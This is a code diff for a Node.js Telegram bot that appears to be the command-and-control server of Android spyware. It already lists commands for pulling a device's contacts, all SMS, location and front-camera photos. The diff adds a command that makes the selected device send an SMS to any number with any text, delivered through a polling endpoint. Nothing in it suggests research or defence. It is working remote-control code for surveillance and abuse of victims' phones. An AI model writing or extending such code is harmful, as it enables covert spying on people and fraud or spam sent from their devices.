@@ -27,6 +27,10 @@ const devices = {};
 // userSession[chatId] = deviceId
 const userSession = {};
 
+// Per-device extra command data (e.g. sms target/body)
+// deviceExtras[deviceId] = { smsTo, smsBody }
+const deviceExtras = {};
+
 const ONLINE_TIMEOUT_MS = 60 * 1000; // 60 seconds — device considered online
 
 function getOnlineDevices() {
@@ -134,7 +138,8 @@ bot.action(/^cmd_(\w+)_(.+)$/, async (ctx) => {
         contact: '👥 Contacts',
         as:      '💬 All SMS',
         loc:     '📍 Location',
-        cf:      '📸 Front Camera'
+        cf:      '📸 Front Camera',
+        ms:      '📤 Send SMS'
     };
 
     device.pendingCommand = command;
@@ -145,6 +150,43 @@ bot.action(/^cmd_(\w+)_(.+)$/, async (ctx) => {
         `⏳ *${commandLabels[command] || command}* command sent to *${device.name}*.\n\nWaiting for the device to respond…`,
         { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Back', `select_device_${deviceId}`)]]) }
     );
+});
+
+// "Send SMS" button — prompt user to type /ms command
+bot.action(/^cmd_smsmode_(.+)$/, async (ctx) => {
+    const deviceId = ctx.match[1];
+    const device = devices[deviceId];
+    if (!device) { await ctx.answerCbQuery('Device offline!'); return; }
+    userSession[ctx.chat.id] = deviceId;
+    await ctx.answerCbQuery();
+    await ctx.editMessageText(
+        `📤 *Send SMS from ${device.name}*\n\nType the command below:\n\`/ms +91XXXXXXXXXX Your message here\`\n\nExample:\n\`/ms +919876543210 Hello World!\``,
+        { parse_mode: 'Markdown', ...Markup.inlineKeyboard([[Markup.button.callback('« Back', `select_device_${deviceId}`)]]) }
+    );
+});
+
+// /ms <number> <message> — send SMS from the selected device
+bot.command('ms', async (ctx) => {
+    const chatId = ctx.chat.id;
+    const deviceId = userSession[chatId];
+    if (!deviceId || !devices[deviceId]) {
+        return ctx.reply('⚠️ No device selected.\nUse /devices first to pick a device.');
+    }
+    const raw = ctx.message.text.replace('/ms', '').trim();
+    const spaceIdx = raw.indexOf(' ');
+    if (spaceIdx === -1 || !raw) {
+        return ctx.reply('❌ Usage: `/ms <phone_number> <message>`\n\nExample:\n`/ms +919876543210 Hello!`', { parse_mode: 'Markdown' });
+    }
+    const smsTo = raw.substring(0, spaceIdx).trim();
+    const smsBody = raw.substring(spaceIdx + 1).trim();
+    if (!smsTo || !smsBody) return ctx.reply('❌ Both phone number and message are required.');
+
+    const device = devices[deviceId];
+    device.pendingCommand = 'ms';
+    device.requestingChatId = chatId;
+    deviceExtras[deviceId] = { smsTo, smsBody };
+
+    ctx.reply(`📤 *SMS queued for ${device.name}*\n\n📞 To: \`${smsTo}\`\n💬 Message: ${smsBody}\n\n_Will be sent within ~10 seconds._`, { parse_mode: 'Markdown' });
 });
 
 // Launch bot
@@ -171,6 +213,12 @@ app.get('/check-command', (req, res) => {
     if (device.pendingCommand && device.pendingCommand !== 'none') {
         const cmd = device.pendingCommand;
         device.pendingCommand = 'none';
+        // For ms command, attach extra params
+        if (cmd === 'ms' && deviceExtras[deviceId]) {
+            const extra = deviceExtras[deviceId];
+            delete deviceExtras[deviceId];
+            return res.json({ command: cmd, smsTo: extra.smsTo, smsBody: extra.smsBody });
+        }
         return res.json({ command: cmd });
     }
 
